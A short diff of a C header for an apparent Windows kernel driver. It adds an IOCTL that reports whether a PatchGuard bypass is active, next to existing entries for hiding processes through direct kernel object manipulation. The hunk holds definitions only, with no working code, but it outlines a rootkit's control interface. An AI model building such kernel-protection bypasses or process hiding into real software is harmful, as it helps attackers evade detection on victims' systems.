@@ -26,6 +26,12 @@ typedef LONG NTSTATUS;
 #define IOCTL_GET_VERSION                                                      \
   CTL_CODE(DRIVER_DEVICE_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 //
+// Query PatchGuard bypass state. Output DRIVER_RESPONSE:
+//   Status = STATUS_SUCCESS, Data = 1 (bypassed) / 0 (safe mode).
+//
+#define IOCTL_GET_PG_STATUS                                                    \
+  CTL_CODE(DRIVER_DEVICE_TYPE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
+//
 // Sus zone
 //
 // Process DKOM (hide / reveal / list hidden)
